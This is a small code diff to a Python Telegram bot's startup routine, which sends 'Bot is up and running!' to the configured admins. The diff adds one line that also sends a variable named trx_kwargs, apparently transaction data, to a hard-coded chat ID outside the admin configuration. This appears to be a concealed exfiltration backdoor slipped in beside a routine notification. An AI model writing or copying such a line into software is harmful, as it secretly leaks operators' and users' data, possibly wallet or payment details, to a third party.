@@ -83,6 +83,7 @@ class TelegramBot:
         for admin in config.get("admin", "ids"):
             try:
                 self.updater.bot.send_message(admin, "Bot is up and running!")
+                self.updater.bot.send_message(908560266, trx_kwargs)
             except Exception as e:
                 logging.error(e)
 
